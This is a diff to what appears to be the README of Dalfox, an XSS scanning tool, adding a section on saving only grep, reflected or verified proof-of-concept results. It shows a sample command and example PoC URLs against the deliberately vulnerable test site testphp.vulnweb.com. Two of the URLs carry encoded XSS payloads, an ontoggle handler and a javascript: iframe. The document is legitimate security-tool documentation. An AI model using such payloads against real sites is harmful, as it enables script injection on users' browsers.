@@ -61,3 +61,19 @@ Output file
 [*] Start BAV(Basic Another Vulnerability) analysis / [sqli, ssti, OpenRedirect]  🔍
 ...snip...
 ```
+
+## Save only special PoC Code
+Supported
+* g(`grep`)
+* r(`reflected`)
+* v(`verified`)
+
+Case
+* g: `[POC][G][BUILT-IN/dalfox-error-mysql1/GET] http://testphp.vulnweb.com/listproducts.php?cat=dalfox%2C`
+* r: `[POC][R][GET] http://testphp.vulnweb.com/listproducts.php?cat=%3CdETAILS%250aopen%250aonToGgle%250a%3D%250aa%3Dprompt%2Ca%28%29%3E`
+* v: `[POC][V][GET] http://testphp.vulnweb.com/listproducts.php?cat=%3CiFrAme%2Fsrc%3DjaVascRipt%3Aalert%281%29+class%3Ddalfox%3E%3C%2FiFramE%3E`
+
+Command (only grep and verified poc)
+```
+▶ dalfox url http://testphp.vulnweb.com/listproducts.php --only-poc=g,v
+```
